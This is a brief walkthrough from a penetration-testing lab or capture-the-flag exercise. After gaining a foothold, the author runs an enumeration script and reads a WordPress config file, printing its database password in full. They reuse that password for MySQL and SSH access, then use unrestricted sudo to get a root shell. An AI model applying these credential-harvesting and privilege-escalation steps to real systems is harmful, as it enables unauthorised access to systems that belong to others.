#### -Uploaded and ran linux-smart-enumeration script "lse.sh" and found services  listening on localhost. Typed "ss –nltp" to show all running services/processes running on all ports:

![](../Pasted%20Images/Pasted%20image%2020220505205536.png)

![](../Pasted%20Images/Pasted%20image%2020220505205618.png)

#### -Typed "ls -ls /var/www/html/wordpress | grep .conf" to list all config files for site and cat'd the configuration file and found the following credentials: 

/** The name of the database for WordPress */ 

define( 'DB_NAME', 'wordpress_db' ); 

 

/** MySQL database username */ 

define( 'DB_USER', 'wp_user' ); 

  

/** MySQL database password */ 

define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' ); 

  

/** MySQL hostname */ 

define( 'DB_HOST', 'localhost' ); 

![](../Pasted%20Images/Pasted%20image%2020220505205728.png)

![](../Pasted%20Images/Pasted%20image%2020220505205820.png)

#### -Typed "mysql -h localhost -u wp_user -p wordpress_db" and entered the password "R3&]vzhHmMn9,:-5" and got into the mysql database: 

![](../Pasted%20Images/Pasted%20image%2020220505205906.png)

#### -Typed "ssh takis@localhost" then input the password "R3&]vzhHmMn9,:-5" found earlier in the config file and received a ssh session for user "takis" below: 

![](../Pasted%20Images/Pasted%20image%2020220505210058.png)

#### -Typed "sudo-l" and found user can run sudo for any command. Then typed "sudo su root" and received a root shell and found root flag in "proof.txt" file: 

![](../Pasted%20Images/Pasted%20image%2020220505210137.png)